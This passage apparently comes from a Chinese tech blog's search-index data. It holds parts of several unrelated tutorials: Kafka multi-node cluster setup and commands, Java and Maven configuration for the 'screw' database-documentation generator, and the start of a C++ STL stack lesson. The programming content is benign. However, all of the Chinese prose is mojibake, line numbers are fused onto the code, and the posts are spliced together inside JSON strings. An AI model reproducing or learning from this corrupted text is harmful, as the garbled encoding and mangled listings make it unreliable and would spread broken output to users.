config/connect-distributed.properties# é›†ç¾¤ç¯å¢ƒçš„ç«¯å£å·bootstrap.servers=localhost:9092 1234# vim config/producer.properties# å‘å¸ƒç«¯çš„ç«¯å£å·bootstrap.servers=localhost:9092 1234# vim config/consumer.properties# æ¶ˆè´¹ç«¯çš„ç«¯å£å·bootstrap.servers=localhost:9092 Kafka åˆ›å»ºå¤šä¸ªèŠ‚ç‚¹ å¤åˆ¶ä¸¤ä»½ä¸Šé¢å·²ç»é…ç½®å¥½çš„ Kafka å®‰è£…ç›®å½•ï¼Œä»¥æ­¤ä½œä¸ºé›†ç¾¤ä¸­å¦å¤–ä¸¤ä¸ªèŠ‚ç‚¹çš„å®‰è£…æ–‡ä»¶ï¼Œä¾‹å¦‚ kafka-node2ã€kafka-node3ã€‚å®‰è£…ç›®å½•å¤åˆ¶å®Œæˆåï¼Œè¿˜éœ€è¦ä¸ºæ¯ä¸ªæ–°èŠ‚ç‚¹æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ›´æ”¹å¯¹åº”çš„å†…å®¹ï¼š ç¬¬ä¸€æ­¥ï¼šæ›´æ”¹ server.properties é…ç½®æ–‡ä»¶é‡Œçš„ broker.idã€log.dirsç¬¬äºŒæ­¥ï¼šæ›´æ”¹ Kafka ç›‘å¬çš„ç«¯å£ï¼ŒåŒ…æ‹¬æ›´æ”¹ä¸Šè¿°çš„ server.propertiesã€connect-standalone.propertiesã€connect-distributed.propertiesã€producer.propertiesã€consumer.properties é…ç½®æ–‡ä»¶ ä¸Šè¿°ä¸¤ä¸ªæ­¥éª¤å®Œæˆåï¼ŒèŠ‚ç‚¹äºŒå’ŒèŠ‚ç‚¹ä¸‰çš„æœ€ç»ˆé…ç½®å¦‚ä¸‹ï¼š 123456# èŠ‚ç‚¹äºŒçš„é…ç½®broker.id=2listeners=PLAINTEXT://:9093log.dirs=/usr/local/kafka-cluster/kafka-node2/logsbootstrap.servers=localhost:9093 123456# èŠ‚ç‚¹ä¸‰çš„é…ç½®broker.id=3listeners=PLAINTEXT://:9094log.dirs=/usr/local/kafka-cluster/kafka-node3/logsbootstrap.servers=localhost:9094 é›†ç¾¤ç®¡ç† é›†ç¾¤å¯åŠ¨ æ³¨æ„ å¯åŠ¨ Kafka é›†ç¾¤ä¹‹å‰ï¼Œå¿…é¡»ç¡®ä¿ Zookeeper é›†ç¾¤å·²ç»å¯åŠ¨æˆåŠŸï¼Œè¿™æ˜¯å› ä¸ºæœ¬æ–‡æ­å»ºçš„ Kafka é›†ç¾¤ä¾èµ–äº Zookeeper é›†ç¾¤ã€‚ 123456789# åå°å¯åŠ¨# /usr/local/kafka-cluster/kafka-node1/bin/kafka-server-start.sh -daemon /usr/local/kafka-cluster/kafka-node1/config/server.properties# /usr/local/kafka-cluster/kafka-node2/bin/kafka-server-start.sh -daemon /usr/local/kafka-cluster/kafka-node2/config/server.properties# /usr/local/kafka-cluster/kafka-node3/bin/kafka-server-start.sh -daemon /usr/local/kafka-cluster/kafka-node3/config/server.properties# æˆ–è€…å‰å°å¯åŠ¨ï¼ˆå¯ç›´æ¥æŸ¥çœ‹å¯åŠ¨æ—¶è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯ï¼‰# /usr/local/kafka-cluster/kafka-node1/bin/kafka-server-start.sh /usr/local/kafka-cluster/kafka-node1/config/server.properties# /usr/local/kafka-cluster/kafka-node2/bin/kafka-server-start.sh /usr/local/kafka-cluster/kafka-node2/config/server.properties# /usr/local/kafka-cluster/kafka-node3/bin/kafka-server-start.sh /usr/local/kafka-cluster/kafka-node3/config/server.properties æŸ¥çœ‹çŠ¶æ€ é›†ç¾¤å¯åŠ¨åï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹é›†ç¾¤çš„è¿è¡ŒçŠ¶æ€ã€‚å¦‚æœå‘ç°é›†ç¾¤å¯åŠ¨å¤±è´¥ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å‰å°çš„æ–¹å¼å†æ¬¡å¯åŠ¨é›†ç¾¤ï¼Œç„¶åæ ¹æ®ç»ˆç«¯è¾“å‡ºçš„é”™è¯¯æ—¥å¿—ä¿¡æ¯æ¥å®šä½é—®é¢˜ã€‚ 12345678910# æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ# netstat -nplt | grep 9092# netstat -nplt | grep 9093# netstat -nplt | grep 9094# æŸ¥çœ‹Kafkaè¿›ç¨‹# ps -aux | grep kafka# æŸ¥çœ‹Javaè¿›ç¨‹# jps -l é›†ç¾¤å…³é—­ æ³¨æ„ å…³é—­ Kafka é›†ç¾¤æ—¶ï¼Œä¸€å®šè¦ç­‰ Kafka æ‰€æœ‰èŠ‚ç‚¹è¿›ç¨‹å…¨éƒ¨å…³é—­åå†å…³é—­ Zookeeper é›†ç¾¤ã€‚å› ä¸º Zookeeper é›†ç¾¤å½“ä¸­è®°å½•ç€ Kafka é›†ç¾¤çš„ç›¸å…³ä¿¡æ¯ï¼ŒZookeeper é›†ç¾¤ä¸€æ—¦å…ˆå…³é—­ï¼ŒKafka é›†ç¾¤å°±æ²¡æœ‰åŠæ³•å†è·å–å…³é—­è¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ­¤æ—¶åªèƒ½æ‰‹åŠ¨å¼ºåˆ¶æ€æ­» Kafka è¿›ç¨‹ã€‚ 123# /usr/local/kafka-cluster/kafka-node1/bin/kafka-server-stop.sh stop# /usr/local/kafka-cluster/kafka-node2/bin/kafka-server-stop.sh stop# /usr/local/kafka-cluster/kafka-node3/bin/kafka-server-stop.sh stop æ¸…ç©ºæ•°æ® è‹¥å¸Œæœ›æ¸…ç©º Kafka é›†ç¾¤çš„æ•°æ®ï¼Œåˆ™å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œã€‚æ¸…ç©ºæ•°æ®çš„æ“ä½œä¸å¯æ¢å¤ï¼Œç”Ÿäº§ç¯å¢ƒä¸‹æ…ç”¨ã€‚ ç¬¬ä¸€æ­¥ï¼šå…³é—­ Kafka é›†ç¾¤ç¬¬äºŒæ­¥ï¼šè¿æ¥ Zookeeper é›†ç¾¤ï¼Œç„¶ååˆ é™¤ /kafka ç›®å½•ç¬¬ä¸‰æ­¥ï¼šåˆ é™¤ Kafka å„ä¸ªé›†ç¾¤èŠ‚ç‚¹çš„å®‰è£…ç›®å½•ä¸‹çš„ logs ç›®å½•ï¼ˆæ–‡ä»¶å¤¹ï¼‰ç¬¬å››æ­¥ï¼šé‡å¯ Kafka é›†ç¾¤ é›†ç¾¤æµ‹è¯• è¿›å…¥ä»»æ„èŠ‚ç‚¹çš„å®‰è£…ç›®å½•ä¸‹çš„ bin ç›®å½• 12# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/kafka-cluster/kafka-node1/bin åˆ›å»ºä¸»é¢˜ 12# åˆ›å»ºä¸»é¢˜# ./kafka-topics.sh --create --bootstrap-server 127.0.0.1:9092 --replication-factor 3 --partitions 1 --topic test æŸ¥çœ‹ä¸»é¢˜åˆ—è¡¨ 12# æŸ¥çœ‹ä¸»é¢˜åˆ—è¡¨# ./kafka-topics.sh --list --bootstrap-server 127.0.0.1:9092 æŸ¥çœ‹ä¸»é¢˜è¯¦ç»†ä¿¡æ¯ 12# æŸ¥çœ‹ä¸»é¢˜è¯¦ç»†ä¿¡æ¯# ./kafka-topics.sh --bootstrap-server 127.0.0.1:9092 --topic test --describe å¯åŠ¨æ§åˆ¶å°æ¶ˆè´¹è€… 12# å¯åŠ¨æ¶ˆè´¹è€…# ./kafka-console-consumer.sh --bootstrap-server 127.0.0.1:9092 --topic test --from-beginning å¯åŠ¨æ§åˆ¶å°ç”Ÿäº§è€… 12# å¯åŠ¨ç”Ÿäº§è€…# ./kafka-console-producer.sh --broker-list 127.0.0.1:9092 --topic test ç”Ÿäº§è€…æ­£å¸¸å¯åŠ¨åï¼Œåœ¨ç”Ÿäº§è€…çš„æ§åˆ¶å°æ‰‹åŠ¨è¾“å…¥ hello kafkaï¼Œæ¶ˆè´¹è€…çš„æ§åˆ¶å°å°±å¯ä»¥æ¶ˆè´¹åˆ°ç”Ÿäº§è€…çš„æ¶ˆæ¯ï¼Œå¹¶è¾“å‡º hello kafkaï¼Œè¿™è¡¨ç¤ºæ¶ˆè´¹è€…æˆåŠŸæ¶ˆè´¹äº†ç”Ÿäº§è€…å‘é€çš„æ¶ˆæ¯ï¼ å‚è€ƒåšå®¢ Kafka é›†ç¾¤æ­å»ºè¶…è¯¦ç»†æ•™ç¨‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Java è‡ªåŠ¨ç”Ÿæˆæ•°æ®åº“æ–‡æ¡£",url:"/posts/28df7196.html",text:'å‰è¨€åœ¨ä¼ä¸šçº§å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šæœ‰ç¼–å†™æ•°æ®åº“æ–‡æ¡£çš„æ—¶é—´ä»˜å‡ºï¼Œå…³äºæ•°æ®åº“æ–‡æ¡£çš„çŠ¶æ€ï¼šè¦ä¹ˆæ²¡æœ‰ã€è¦ä¹ˆæœ‰ä½†éƒ½æ˜¯æ‰‹å†™ã€åæœŸè¿ç»´å¼€å‘éƒ½éœ€è¦æ‰‹åŠ¨å¯¹æ–‡æ¡£è¿›è¡Œç»´æŠ¤ï¼Œå¾ˆæ˜¯ç¹çã€‚å¦‚æœå¿˜è®°ä¸€æ¬¡ç»´æŠ¤å°±ä¼šç»™ä»¥åçš„å·¥ä½œé€ æˆå¾ˆå¤šå›°æ‰°ï¼Œè¿™æ— å½¢ä¸­ç•™äº†å¾ˆå¤šå‘ç»™è‡ªå·±å’Œåäººã€‚screw æ˜¯ä¸€æ¬¾ç®€æ´å¥½ç”¨çš„æ•°æ®åº“æ–‡æ¡£ç”Ÿæˆå·¥å…·ï¼Œä¸“ä¸ºè§£å†³è¿™ä¸€å¼€å‘ç—›ç‚¹è€Œç”Ÿã€‚ screw ä»‹ç»ç‰¹è‰²åŠŸèƒ½ çµæ´»æ‰©å±• æ”¯æŒè‡ªå®šä¹‰æ¨¡æ¿ æ”¯æŒå¤šç§æ•°æ®åº“ æ”¯æŒå¤šç§æ ¼å¼çš„æ–‡æ¡£ ç®€æ´ã€è½»é‡ã€è®¾è®¡è‰¯å¥½ æ•°æ®åº“æ”¯æŒ MySQL MariaDB TIDB Oracle SqlServer PostgreSQL Cache DBï¼ˆ2016ï¼‰ æ–‡æ¡£ç±»å‹æ”¯æŒ Html Word Markdown screw ä½¿ç”¨åŸºäº Java ä»£ç ç¬¬ä¸€ç§ä½¿ç”¨æ–¹å¼æ˜¯åŸºäº Java ä»£ç ï¼Œè‡ªåŠ¨ç”Ÿæˆæ•°æ®åº“æ–‡æ¡£ã€‚ Maven ä¾èµ–12345678910111213141516171819202122&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.freemarker&lt;/groupId&gt; &lt;artifactId&gt;freemarker&lt;/artifactId&gt; &lt;version&gt;2.3.31&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.smallbun.screw&lt;/groupId&gt; &lt;artifactId&gt;screw-core&lt;/artifactId&gt; &lt;version&gt;1.0.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.zaxxer&lt;/groupId&gt; &lt;artifactId&gt;HikariCP&lt;/artifactId&gt; &lt;version&gt;3.4.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.20&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; Java ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import cn.smallbun.screw.core.Configuration;import cn.smallbun.screw.core.engine.EngineConfig;import cn.smallbun.screw.core.engine.EngineFileType;import cn.smallbun.screw.core.engine.EngineTemplateType;import cn.smallbun.screw.core.execute.DocumentationExecute;import cn.smallbun.screw.core.process.ProcessConfig;import com.zaxxer.hikari.HikariConfig;import com.zaxxer.hikari.HikariDataSource;import javax.sql.DataSource;import java.util.ArrayList;/** * ç”Ÿæˆæ•°æ®åº“æ–‡æ¡£ */public class ScrewTest { public static final String fileOutputDir = "D:/database/docs"; public static void main(String[] args) { documentGeneration(); } /** * æ–‡æ¡£ç”Ÿæˆ */ public static void documentGeneration() { //æ•°æ®æº HikariConfig hikariConfig = new HikariConfig(); hikariConfig.setDriverClassName("com.mysql.cj.jdbc.Driver"); hikariConfig.setJdbcUrl("jdbc:mysql://127.0.0.1:3306/database"); hikariConfig.setUsername("root"); hikariConfig.setPassword("123456"); //è®¾ç½®å¯ä»¥è·å–tables remarksä¿¡æ¯ hikariConfig.addDataSourceProperty("useInformationSchema", "true"); hikariConfig.setMinimumIdle(2); hikariConfig.setMaximumPoolSize(5); DataSource dataSource = new HikariDataSource(hikariConfig); //ç”Ÿæˆé…ç½® EngineConfig engineConfig = EngineConfig.builder() //ç”Ÿæˆæ–‡ä»¶è·¯å¾„ .fileOutputDir(fileOutputDir) //æ‰“å¼€ç›®å½• .openOutputDir(true) //æ–‡ä»¶ç±»å‹ .fileType(EngineFileType.HTML) //ç”Ÿæˆæ¨¡æ¿å®ç° .produceType(EngineTemplateType.freemarker) //è‡ªå®šä¹‰æ–‡ä»¶åç§° .fileName("è‡ªå®šä¹‰æ–‡ä»¶åç§°").build(); //å¿½ç•¥è¡¨ ArrayList&lt;String&gt; ignoreTableName = new ArrayList&lt;&gt;(); //å¿½ç•¥è¡¨å‰ç¼€ ArrayList&lt;String&gt; ignorePrefix = new ArrayList&lt;&gt;(); //å¿½ç•¥è¡¨åç¼€ ArrayList&lt;String&gt; ignoreSuffix = new ArrayList&lt;&gt;(); ProcessConfig processConfig = ProcessConfig.builder() //æŒ‡å®šç”Ÿæˆé€»è¾‘ã€å½“å­˜åœ¨æŒ‡å®šè¡¨ã€æŒ‡å®šè¡¨å‰ç¼€ã€æŒ‡å®šè¡¨åç¼€æ—¶ï¼Œå°†ç”ŸæˆæŒ‡å®šè¡¨ï¼Œå…¶ä½™è¡¨ä¸ç”Ÿæˆã€å¹¶è·³è¿‡å¿½ç•¥è¡¨é…ç½® //æ ¹æ®åç§°æŒ‡å®šè¡¨ç”Ÿæˆ .designatedTableName(new ArrayList&lt;&gt;()) //æ ¹æ®è¡¨å‰ç¼€ç”Ÿæˆ .designatedTablePrefix(new ArrayList&lt;&gt;()) //æ ¹æ®è¡¨åç¼€ç”Ÿæˆ .designatedTableSuffix(new ArrayList&lt;&gt;()) //å¿½ç•¥è¡¨å .ignoreTableName(ignoreTableName) //å¿½ç•¥è¡¨å‰ç¼€ .ignoreTablePrefix(ignorePrefix) //å¿½ç•¥è¡¨åç¼€ .ignoreTableSuffix(ignoreSuffix).build(); //é…ç½® Configuration config = Configuration.builder() //ç‰ˆæœ¬ .version("1.0.0") //æè¿° .description("æ•°æ®åº“è®¾è®¡æ–‡æ¡£ç”Ÿæˆ") //æ•°æ®æº .dataSource(dataSource) //ç”Ÿæˆé…ç½® .engineConfig(engineConfig) //ç”Ÿæˆé…ç½® .produceConfig(processConfig) .build(); //æ‰§è¡Œç”Ÿæˆ new DocumentationExecute(config).execute(); }} åŸºäº Maven æ’ä»¶ç¬¬äºŒç§ä½¿ç”¨æ–¹å¼æ˜¯åŸºäº Maven æ’ä»¶ï¼Œè‡ªåŠ¨ç”Ÿæˆæ•°æ®åº“æ–‡æ¡£ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;cn.smallbun.screw&lt;/groupId&gt; &lt;artifactId&gt;screw-maven-plugin&lt;/artifactId&gt; &lt;version&gt;${lastVersion}&lt;/version&gt; &lt;dependencies&gt; &lt;!-- HikariCP --&gt; &lt;dependency&gt; &lt;groupId&gt;com.zaxxer&lt;/groupId&gt; &lt;artifactId&gt;HikariCP&lt;/artifactId&gt; &lt;version&gt;3.4.5&lt;/version&gt; &lt;/dependency&gt; &lt;!--mysql driver--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.20&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;configuration&gt; &lt;!--username--&gt; &lt;username&gt;root&lt;/username&gt; &lt;!--password--&gt; &lt;password&gt;123456&lt;/password&gt; &lt;!--driver--&gt; &lt;driverClassName&gt;com.mysql.cj.jdbc.Driver&lt;/driverClassName&gt; &lt;!--jdbc url--&gt; &lt;jdbcUrl&gt;jdbc:mysql://127.0.0.1:3306/database&lt;/jdbcUrl&gt; &lt;!--ç”Ÿæˆæ–‡ä»¶ç±»å‹--&gt; &lt;fileType&gt;HTML&lt;/fileType&gt; &lt;!--æ‰“å¼€æ–‡ä»¶è¾“å‡ºç›®å½•--&gt; &lt;openOutputDir&gt;false&lt;/openOutputDir&gt; &lt;!--ç”Ÿæˆæ¨¡æ¿--&gt; &lt;produceType&gt;freemarker&lt;/produceType&gt; &lt;!--æ–‡æ¡£åç§° ä¸ºç©ºæ—¶:å°†é‡‡ç”¨[æ•°æ®åº“åç§°-æè¿°-ç‰ˆæœ¬å·]ä½œä¸ºæ–‡æ¡£åç§°--&gt; &lt;fileName&gt;æµ‹è¯•æ–‡æ¡£åç§°&lt;/fileName&gt; &lt;!--æè¿°--&gt; &lt;description&gt;æ•°æ®åº“æ–‡æ¡£ç”Ÿæˆ&lt;/description&gt; &lt;!--ç‰ˆæœ¬--&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;!--æ ‡é¢˜--&gt; &lt;title&gt;æ•°æ®åº“æ–‡æ¡£&lt;/title&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;compile&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;run&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; æ‰©å±•æ¨¡å—åœ¨æ—¥å¸¸çš„å¼€å‘ä¸­ï¼Œç»è¿‡éœ€æ±‚åˆ†æã€å»ºæ¨¡ä¹‹åï¼Œå¾€å¾€ä¼šå…ˆåœ¨æ•°æ®åº“ä¸­å»ºè¡¨ï¼Œå…¶æ¬¡å†è¿›è¡Œä»£ç çš„å¼€å‘ã€‚ä½¿ç”¨ POJO ç”ŸæˆåŠŸèƒ½å¯ä»¥ç›´æ¥æ ¹æ®æ•°æ®åº“è¡¨ç”Ÿæˆå¯¹åº”çš„ Java POJO å¯¹è±¡ï¼Œè¿™å¯ä»¥å¸®åŠ©å¼€å‘äººå‘˜èŠ‚çœä¸€äº›é‡å¤åŠ³åŠ¨ã€‚screw æ”¯æŒ POJO ç”ŸæˆåŠŸèƒ½ï¼Œç›®å‰å¤„äºåˆæ­¥å¼€å‘çš„çŠ¶æ€ï¼Œä¸”ä»…æ”¯æŒ MySQL æ•°æ®åº“ã€‚ POJO ç”Ÿæˆæ¨¡å—12345&lt;dependency&gt; &lt;groupId&gt;cn.smallbun.screw&lt;/groupId&gt; &lt;artifactId&gt;screw-extension&lt;/artifactId&gt; &lt;version&gt;${lastVersion}&lt;/version&gt; &lt;/dependency&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142/** * POJO ç”Ÿæˆ */void pojoGeneration() { //æ•°æ®æº HikariConfig hikariConfig = new HikariConfig(); hikariConfig.setDriverClassName("com.mysql.cj.jdbc.Driver"); hikariConfig.setJdbcUrl("jdbc:mysql://127.0.0.1:3306/database"); hikariConfig.setUsername("root"); hikariConfig.setPassword("123456"); //è®¾ç½®å¯ä»¥è·å–tables remarksä¿¡æ¯ hikariConfig.addDataSourceProperty("useInformationSchema", "true"); hikariConfig.setMinimumIdle(2); hikariConfig.setMaximumPoolSize(5); DataSource dataSource = new HikariDataSource(hikariConfig); ProcessConfig processConfig = ProcessConfig.builder() //æŒ‡å®šç”Ÿæˆé€»è¾‘ã€å½“å­˜åœ¨æŒ‡å®šè¡¨ã€æŒ‡å®šè¡¨å‰ç¼€ã€æŒ‡å®šè¡¨åç¼€æ—¶ï¼Œå°†ç”ŸæˆæŒ‡å®šè¡¨ï¼Œå…¶ä½™è¡¨ä¸ç”Ÿæˆã€å¹¶è·³è¿‡å¿½ç•¥è¡¨é…ç½® //æ ¹æ®åç§°æŒ‡å®šè¡¨ç”Ÿæˆ .designatedTableName(new ArrayList&lt;&gt;()) //æ ¹æ®è¡¨å‰ç¼€ç”Ÿæˆ .designatedTablePrefix(new ArrayList&lt;&gt;()) //æ ¹æ®è¡¨åç¼€ç”Ÿæˆ .designatedTableSuffix(new ArrayList&lt;&gt;()).build(); //è®¾ç½®ç”Ÿæˆpojoç›¸å…³é…ç½® PojoConfiguration config = new PojoConfiguration(); //è®¾ç½®æ–‡ä»¶å­˜æ”¾è·¯å¾„ config.setPath("/cn/smallbun/screw/"); //è®¾ç½®åŒ…å config.setPackageName("cn.smallbun.screw"); //è®¾ç½®æ˜¯å¦ä½¿ç”¨lombok config.setUseLombok(false); //è®¾ç½®æ•°æ®æº config.setDataSource(dataSource); //è®¾ç½®å‘½åç­–ç•¥ config.setNameStrategy(new HumpNameStrategy()); //è®¾ç½®è¡¨è¿‡æ»¤é€»è¾‘ config.setProcessConfig(processConfig); //æ‰§è¡Œç”Ÿæˆ new PojoExecute(config).execute();} å¸¸è§é—®é¢˜é—®é¢˜ä¸€ ç”Ÿæˆçš„æ•°æ®åº“æ–‡æ¡£å‡ºç°ä¹±ç ï¼Ÿ åœ¨è¿æ¥ MySQL çš„ URL ä¸­åŠ å…¥ characterEncoding=UTF-8 å³å¯ é—®é¢˜äºŒ MySQL æ•°æ®åº“è¡¨å’Œåˆ—å­—æ®µæœ‰æ³¨é‡Šï¼Œä½†ç”Ÿæˆçš„æ•°æ®åº“æ–‡æ¡£å´æ²¡æœ‰æ³¨é‡Šï¼Ÿ åœ¨è¿æ¥ MySQL çš„ URL ä¸­åŠ å…¥ useInformationSchema=true å³å¯ é—®é¢˜ä¸‰ è¿è¡ŒæŠ›å‡ºå¼‚å¸¸ï¼š Caused by: java.lang.NoSuchFieldError: VERSION_2_3_30 æ£€æŸ¥é¡¹ç›®ä¸­ freemarker çš„ä¾èµ–ç‰ˆæœ¬ï¼Œè¿™æ˜¯ç”±äºç‰ˆæœ¬è¿‡ä½é€ æˆçš„ï¼Œå‡çº§ç‰ˆæœ¬ä¸º 2.3.30 å³å¯ é—®é¢˜å›› è¿è¡ŒæŠ›å‡ºå¼‚å¸¸ï¼š java.lang.AbstractMethodError: com.mysql.jdbc.JDBC4Connection.getSchema()Ljava/lang/String; è¿™æ˜¯å› ä¸º MySQL é©±åŠ¨çš„ç‰ˆæœ¬è¿‡ä½é€ æˆçš„ï¼Œå‡çº§ MySQL é©±åŠ¨çš„ç‰ˆæœ¬ä¸ºæœ€æ–°å³å¯ é—®é¢˜äº” è¿è¡ŒæŠ›å‡ºå¼‚å¸¸ï¼š java.lang.AbstractMethodError: oracle.jdbc.driver.T4CConnection.getSchema()Ljava/lang/String; è¿™æ˜¯å› ä¸º Oracle é©±åŠ¨ç‰ˆæœ¬è¿‡ä½é€ æˆçš„ï¼Œåˆ é™¤æˆ–å±è”½å½“å‰çš„é©±åŠ¨ç‰ˆæœ¬ï¼Œå¹¶å°†é©±åŠ¨å‡çº§ä¸ºä»¥ä¸‹ç‰ˆæœ¬ï¼š 12345678910&lt;dependency&gt; &lt;groupId&gt;com.oracle.ojdbc&lt;/groupId&gt; &lt;artifactId&gt;ojdbc8&lt;/artifactId&gt; &lt;version&gt;19.3.0.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;cn.easyproject&lt;/groupId&gt; &lt;artifactId&gt;orai18n&lt;/artifactId&gt; &lt;version&gt;12.1.0.2.0&lt;/version&gt;&lt;/dependency&gt; æ–‡æ¡£ç”Ÿæˆæˆªå›¾ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"Go è¯­è¨€å…¥é—¨åŸºç¡€ä¹‹ä¸€",url:"/posts/42f8c3d7.html",text:"",tags:"goè¯­è¨€"},{title:"C++ è¿›é˜¶åŸºç¡€ä¹‹å…«",url:"/posts/8b87f2be.html",text:'stack å®¹å™¨stack å®¹å™¨çš„æ¦‚å¿µstack æ˜¯ä¸€ç§å…ˆè¿›åå‡ºï¼ˆFirst In Last Outï¼ŒFILOï¼‰çš„æ•°æ®ç»“æ„ï¼Œå®ƒåªæœ‰ä¸€ä¸ªå‡ºå£ã€‚stack å®¹å™¨å…è®¸æ–°å¢å…ƒç´ ã€ç§»é™¤å…ƒç´ ã€å–å¾—æ ˆé¡¶å…ƒç´ ï¼Œä½†æ˜¯é™¤äº†æœ€é¡¶ç«¯çš„å…ƒç´ å¤–ï¼Œæ²¡æœ‰ä»»ä½•å…¶ä»–æ–¹æ³•å¯ä»¥å­˜å– stack ä¸­çš„å…¶ä»–å…ƒç´ ã€‚stack æ²¡æœ‰è¿­ä»£å™¨ï¼Œå®¹å™¨ä¸­æ‰€æœ‰å…ƒç´ çš„è¿›å‡ºéƒ½å¿…é¡»ç¬¦åˆ â€œå…ˆè¿›åå‡ºâ€ çš„è§„åˆ™ï¼Œåªæœ‰ stack æœ€é¡¶ç«¯çš„å…ƒç´ ï¼Œæ‰æœ‰æœºä¼šè¢«å¤–ç•Œå–ç”¨ã€‚æ¢è¨€ä¹‹ï¼Œstack ä¸æä¾›éå†åŠŸèƒ½ï¼Œä¹Ÿä¸æä¾›è¿­ä»£å™¨ã€‚deque æ˜¯åŒå‘å¼€å£çš„æ•°æ®ç»“æ„ï¼Œè‹¥ä»¥ deque ä¸ºåº•éƒ¨ç»“æ„å¹¶å°é—­å…¶å¤´ç«¯å¼€å£ï¼Œä¾¿è½»è€Œæ˜“ä¸¾åœ°å½¢æˆä¸€ä¸ª stackã€‚å› æ­¤ï¼ŒSGI STL ä¾¿ä»¥ deque ä½œä¸ºç¼ºçœæƒ…å†µä¸‹çš„ stack åº•éƒ¨ç»“æ„ã€‚ç”±äº stack ä»¥åº•éƒ¨å®¹å™¨å®Œæˆå…¶æ‰€æœ‰å·¥ä½œï¼Œè€Œå…·æœ‰è¿™ç§ â€œä¿®æ”¹æŸç‰©æ¥å£ï¼Œå½¢æˆå¦ä¸€ç§é£è²Œâ€ çš„æ€§è´¨è€…ï¼Œç§°ä¸º adapterï¼ˆé…æ¥å™¨ï¼‰ï¼Œå› æ­¤ï¼ŒSTL stack å¾€å¾€ä¸è¢«å½’ç±»ä¸º containerï¼ˆå®¹å™¨ï¼‰ï¼Œè€Œè¢«å½’ç±»ä¸º container adapterï¼ˆå®¹å™¨é…æ¥å™¨ï¼‰ã€‚ stack å®¹å™¨çš„ä½¿ç”¨12345678910111213141516171819202122232425262728293031323334#include&lt;iostream&gt;#include&lt;stack&gt;using namespace std;void printStack(stack&lt;int&gt; &amp;s) { // åˆ¤æ–­å®¹å™¨æ˜¯å¦ä¸ºç©º while (!s.empty()) { // è·å–æ ˆé¡¶å…ƒç´  cout &lt;&lt; s.top() &lt;&lt; " "; // å¼¹å‡ºæ ˆé¡¶å…ƒç´ ï¼ˆå¼¹æ ˆï¼‰ s.pop(); } cout &lt;&lt; endl;}int main() { // é»˜è®¤æ„é€ å‡½æ•° stack&lt;int&gt; s1; // å‘æ ˆé¡¶æ·»åŠ å…ƒç´ ï¼ˆå‹æ ˆï¼‰ s1.push(5); s1.push(12); s1.push(24); s1.push(35); s1.push(46); printStack(s1); // æ‹·è´æ„é€ å‡½æ•° stack&lt;int&gt; s2 = s1; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 146 35 24 12 5 queue å®¹å™¨queue å®¹å™¨çš„æ¦‚å¿µqueue æ˜¯ä¸€ç§å…ˆè¿›å…ˆå‡ºï¼ˆFirst In First Outï¼ŒFIFOï¼‰çš„æ•°æ®ç»“æ„ï¼Œå®ƒæœ‰ä¸¤ä¸ªå‡ºå£ã€‚queue å®¹å™¨å…è®¸ä»ä¸€ç«¯æ–°å¢å…ƒç´ 